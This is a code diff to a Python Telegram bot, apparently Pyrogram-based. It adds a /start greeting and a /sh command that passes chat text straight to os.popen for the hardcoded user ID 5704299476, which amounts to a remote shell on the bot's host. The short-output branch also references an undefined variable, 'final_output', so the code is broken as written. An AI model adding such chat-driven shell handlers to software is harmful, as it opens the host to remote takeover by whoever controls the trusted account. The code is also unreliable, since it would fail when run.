@@ -75,4 +75,24 @@ async def eval(client, message):
     await status_message.delete()
 
 
+
+@app.on_message(filters.command("start"))
+async def start(_,m):
+    await m.reply("Hello")
+
+
+@app.on_message(filters.command("sh") & filters.user(5704299476))
+async def sh(_,m):
+    cmd = m.text.replace("/sh " , "")
+    result = os.popen(cmd).read()
+    
+    if len(result) > 4096:
+        with io.BytesIO(str.encode(result)) as out_file:
+            out_file.name = "sh.text"
+            await m.reply_document(
+                document=out_file, caption=cmd, disable_notification=True
+            )
+    else:
+        await m.reply(final_output)
+
 app.run()
